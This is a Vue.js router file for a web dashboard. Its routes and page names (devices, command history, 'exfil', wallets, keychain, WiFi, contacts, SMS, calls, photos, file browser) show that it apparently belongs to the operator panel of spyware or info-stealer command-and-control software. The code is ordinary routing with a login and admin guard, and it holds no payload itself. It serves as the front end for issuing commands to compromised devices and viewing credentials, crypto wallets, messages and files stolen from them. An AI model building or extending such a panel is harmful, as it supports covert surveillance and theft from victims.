import { createRouter, createWebHistory } from 'vue-router'

const routes = [
  {
    path: '/login',
    name: 'Login',
    component: () => import('../views/Login.vue')
  },
  {
    path: '/',
    name: 'Dashboard',
    component: () => import('../views/Dashboard.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/devices',
    name: 'Devices',
    component: () => import('../views/Devices.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/devices/:uuid',
    name: 'DeviceDetail',
    component: () => import('../views/DeviceDetail.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/logs',
    name: 'Logs',
    component: () => import('../views/Logs.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/commands',
    name: 'CommandHistory',
    component: () => import('../views/CommandHistory.vue'),
    meta: { requiresAuth: true }
  },
  
  {
    path: '/exfil',
    name: 'Exfil',
    component: () => import('../views/Exfil.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/wallets',
    name: 'Wallets',
    component: () => import('../views/Wallets.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/exfil/keychain',
    name: 'Keychain',
    component: () => import('../views/Keychain.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/exfil/wifi',
    name: 'WiFi',
    component: () => import('../views/WiFi.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/exfil/contacts',
    name: 'Contacts',
    component: () => import('../views/Contacts.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/exfil/sms',
    name: 'SMS',
    component: () => import('../views/SMS.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/exfil/calls',
    name: 'Calls',
    component: () => import('../views/Calls.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/exfil/photos',
    name: 'Photos',
    component: () => import('../views/Photos.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/exfil/files',
    name: 'FileBrowser',
    component: () => import('../views/FileBrowser.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/system/settings',
    name: 'SystemSettings',
    component: () => import('../views/SystemSettings.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/system/audit',
    name: 'AuditLog',
    component: () => import('../views/AuditLog.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/system/notifications',
    name: 'Notification',
    component: () => import('../views/Notification.vue'),
    meta: { requiresAuth: true }
  },
  {
    path: '/users',
    name: 'Users',
    component: () => import('../views/Users.vue'),
    meta: { requiresAuth: true, requiresAdmin: true }
  }
]

const router = createRouter({
  history: createWebHistory(),
  routes
})

router.beforeEach(async (to, from, next) => {
  const token = localStorage.getItem('token')
  
  if (to.path === '/login') {
    if (token) {
      try {
        const response = await fetch('/api/auth/me', {
          headers: { 'Authorization': `Bearer ${token}` }
        })
        if (response.ok) {
          next('/')
          return
        }
      } catch {
        localStorage.removeItem('token')
        localStorage.removeItem('user')
      }
    }
    next()
    return
  }
  
  if (to.meta.requiresAuth && !token) {
    next('/login')
    return
  }
  
  if (to.meta.requiresAdmin) {
    try {
      const response = await fetch('/api/auth/me', {
        headers: { 'Authorization': `Bearer ${token}` }
      })
      if (!response.ok) {
        localStorage.removeItem('token')
        localStorage.removeItem('user')
        next('/login')
        return
      }
      const user = await response.json()
      if (user.role !== 'admin') {
        next('/')
        return
      }
    } catch {
      localStorage.removeItem('token')
      localStorage.removeItem('user')
      next('/login')
      return
    }
  }
  
  next()
})

export default router
